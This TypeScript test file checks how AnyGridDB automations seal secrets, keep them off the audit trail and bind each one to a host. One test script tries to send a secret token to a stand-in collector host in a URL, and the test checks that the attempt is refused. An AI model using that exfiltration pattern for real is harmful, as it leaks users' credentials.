/**
 * A script's call to an address, and the secrets its automation keeps
 * for it (ADR 0101), against a real database: a secret is sealed, named
 * on the trail and never shown, kept or given again when its automation
 * is saved, and put in a request by the instance, where the script wrote
 * its name.
 */
import { randomBytes } from "node:crypto";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AutomationAction } from "@anygriddb/core";
import type { Database } from "@anygriddb/db";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { loadBindings } from "../auth/access.js";
import { keyRing, parseKeyRing } from "../auth/key-ring.js";
import { rotateKeys } from "../auth/key-rotation.js";
import {
  type AutomationDeps,
  listAutomations,
  runAutomation,
  saveAutomation,
} from "../automations.js";
import { readPage } from "../data/rows.js";
import { insertBase, insertTable } from "../data/schema-ops.js";
import { recordingBus } from "../realtime/recording-bus.test-helpers.js";
import { findLiveTable, loadRowScope } from "../services/rows.js";
import { writeSettings } from "../settings.js";
import { createTestDatabase } from "../test-database.js";
import type { PinnedAnswer, requestPinned } from "../webhooks.js";

const suffix = randomBytes(6).toString("hex");
const master = randomBytes(32);
const key = keyRing(master);
const { bus } = recordingBus();

describe("a script's calls and its automation's secrets", () => {
  let db: Database;
  let close: (() => Promise<void>) | undefined;
  let owner = "";
  let tableId = "";
  /** What the scripts sent, and what they are answered. */
  const sent: Array<{
    url: string;
    options: Parameters<typeof requestPinned>[1];
  }> = [];
  const request: typeof requestPinned = (url, options) => {
    sent.push({ url, options });
    const answer: PinnedAnswer = {
      status: 200,
      headers: { "content-type": "application/json" },
      body: '{"name":"Ada"}',
    };
    return Promise.resolve(answer);
  };

  beforeAll(async () => {
    const created = await createTestDatabase("script_secrets");
    db = created.db;
    close = created.close;
    const person = await db
      .insertInto("users")
      .values({ email: `owner-${suffix}@example.com`, displayName: "Owner" })
      .returning("id")
      .executeTakeFirstOrThrow();
    owner = person.id;
    const baseId = (await insertBase(db, owner, { name: "Calls" })).id;
    tableId = (
      await insertTable(db, owner, {
        baseId,
        name: "People",
        columns: [{ name: "name", label: "Name", fieldType: "text" }],
      })
    ).id;
    await writeSettings(db, owner, { automationScripts: true });
  }, 120_000);

  afterAll(async () => {
    await close?.();
  });

  const deps = (): AutomationDeps => ({
    db,
    bus,
    smtp: {},
    webOrigin: "https://grid.example.org",
    log: () => undefined,
    key,
    request,
  });

  const script = (code: string): AutomationAction => ({
    type: "run_script",
    code,
  });

  function save(input: {
    id?: string;
    actions?: AutomationAction[];
    secrets?: Array<{ name: string; host: string; value?: string }>;
  }) {
    return saveAutomation(
      db,
      {
        ...(input.id ? { id: input.id } : {}),
        tableId,
        createdBy: owner,
        name: "Enrich",
        enabled: true,
        trigger: {
          type: "schedule",
          every: "day",
          at: "09:00",
          timeZone: "UTC",
        },
        actions: input.actions ?? [script("return 1;")],
        ...(input.secrets ? { secrets: input.secrets } : {}),
      },
      key,
    );
  }

  async function stored(id: string) {
    return db
      .selectFrom("automations")
      .selectAll()
      .where("id", "=", id)
      .executeTakeFirstOrThrow();
  }

  async function infoOf(id: string) {
    const list = await listAutomations(db, tableId);
    return list.find((automation) => automation.id === id)?.secrets;
  }

  async function names() {
    const table = await findLiveTable(db, tableId);
    if (!table) throw new Error("no table");
    const scope = await loadRowScope(
      db,
      { userId: owner, bindings: await loadBindings(db, owner) },
      table,
    );
    const page = await readPage(
      db,
      scope.engine,
      { limit: 100, timeZone: "UTC", me: owner },
      { total: false },
    );
    return page.rows.map((row) => row.name);
  }

  it("keeps a secret sealed, and says its name and host and nothing else", async () => {
    const saved = await save({
      secrets: [
        { name: "TOKEN", host: "API.example.org", value: "s3cr3t-value" },
      ],
    });
    const info = await infoOf(saved.id);
    expect(info).toEqual([
      { name: "TOKEN", host: "api.example.org", setAt: expect.any(String) },
    ]);
    const row = await stored(saved.id);
    expect(row.secretsCiphertext).toBeInstanceOf(Buffer);
    expect(row.secretsCiphertext?.toString("latin1")).not.toContain(
      "s3cr3t-value",
    );
    // The trail names the secret, and holds nothing sealed.
    const events = await db
      .selectFrom("auditEvents")
      .select(["newValue", "oldValue"])
      .where("catalogTable", "=", "automations")
      .execute();
    const written = JSON.stringify(events);
    expect(written).toContain('"TOKEN"');
    expect(written).not.toContain("s3cr3t-value");
    expect(written).not.toContain("secrets_ciphertext");
    expect(written).not.toContain("secrets_nonce");
  });

  it("keeps, replaces, and drops secrets as a save names them", async () => {
    const saved = await save({
      secrets: [
        { name: "TOKEN", host: "api.example.org", value: "first" },
        { name: "OTHER", host: "other.example.org", value: "second" },
      ],
    });
    const before = await infoOf(saved.id);
    // Saved again without speaking of secrets: they stay.
    await save({ id: saved.id });
    expect(await infoOf(saved.id)).toEqual(before);
    // Named without a value: kept, as it was set.
    await save({
      id: saved.id,
      secrets: [{ name: "TOKEN", host: "api.example.org" }],
    });
    expect(await infoOf(saved.id)).toEqual(
      before?.filter((secret) => secret.name === "TOKEN"),
    );
    // Sent to another host, it is given again or refused.
    await expect(
      save({
        id: saved.id,
        secrets: [{ name: "TOKEN", host: "collector.example.net" }],
      }),
    ).rejects.toMatchObject({ code: "secret_value_required" });
    // A new secret needs its value too.
    await expect(
      save({
        id: saved.id,
        secrets: [{ name: "FRESH", host: "api.example.org" }],
      }),
    ).rejects.toMatchObject({ code: "secret_value_required" });
    // An empty list drops them all.
    await save({ id: saved.id, secrets: [] });
    expect(await infoOf(saved.id)).toEqual([]);
    const row = await stored(saved.id);
    expect(row.secretsCiphertext).toBeNull();
  });

  it("puts a secret in the request, where the script never reads it", async () => {
    const saved = await save({
      actions: [
        script(`
          const answer = await fetch("https://api.example.org/v1/me", {
            headers: { Authorization: "Bearer {{secret.TOKEN}}" },
          });
          const data = await answer.json();
          console.log(answer.status, answer.ok, answer.headers.get("Content-Type"));
          let refused = "";
          try {
            await fetch("https://collector.example.net/?t={{secret.TOKEN}}");
          } catch (error) {
            refused = error.message;
          }
          return { name: data.name, refused, mine: "{{secret.TOKEN}}" };
        `),
        {
          type: "create_record",
          tableId,
          values: {
            name: "{{script_name}}|{{script_refused}}|{{script_mine}}",
          },
        },
      ],
      secrets: [
        { name: "TOKEN", host: "api.example.org", value: "s3cr3t-value" },
      ],
    });
    sent.length = 0;
    const result = await runAutomation(deps(), await stored(saved.id), {
      depth: 0,
      trigger: "manual",
    });
    expect(result).toEqual({ status: "success", error: undefined });
    expect(sent).toEqual([
      {
        url: "https://api.example.org/v1/me",
        options: {
          method: "GET",
          headers: {
            "user-agent": "AnyGridDB-Automation/1",
            Authorization: "Bearer s3cr3t-value",
          },
          maxBytes: 1024 * 1024,
        },
      },
    ]);
    expect(await names()).toEqual([
      "Ada|Secret kept for another host: TOKEN|{{secret.TOKEN}}",
    ]);
    const run = await db
      .selectFrom("automationRuns")
      .select(["steps"])
      .where("automationId", "=", saved.id)
      .executeTakeFirstOrThrow();
    expect(run.steps).toEqual([
      { type: "1.run_script", ok: true, log: ["200 true application/json"] },
      { type: "2.create_record", ok: true },
    ]);
    expect(JSON.stringify(run.steps)).not.toContain("s3cr3t-value");
  });

  it("is sealed again when the instance's key changes", async () => {
    const saved = await save({
      actions: [
        script(
          `await fetch("https://api.example.org/", { headers: { "X-Key": "{{secret.TOKEN}}" } });`,
        ),
      ],
      secrets: [
        { name: "TOKEN", host: "api.example.org", value: "kept-across" },
      ],
    });
    const newMaster = randomBytes(32);
    const during = parseKeyRing(
      `next:${newMaster.toString("base64")}`,
      `0:${master.toString("base64")}`,
    );
    const report = await rotateKeys(db, during, {
      write: true,
      tlsDir: await mkdtemp(join(tmpdir(), "anygriddb-keys-")),
    });
    expect(report.unreadable).toEqual([]);
    expect(report.rewritten).toBeGreaterThan(0);
    // The earlier key can go: the new one alone opens it for a run.
    sent.length = 0;
    const result = await runAutomation(
      { ...deps(), key: keyRing(newMaster, "next") },
      await stored(saved.id),
      { depth: 0, trigger: "manual" },
    );
    expect(result.status).toBe("success");
    expect(sent[0]?.options.headers).toMatchObject({ "X-Key": "kept-across" });
  });
});
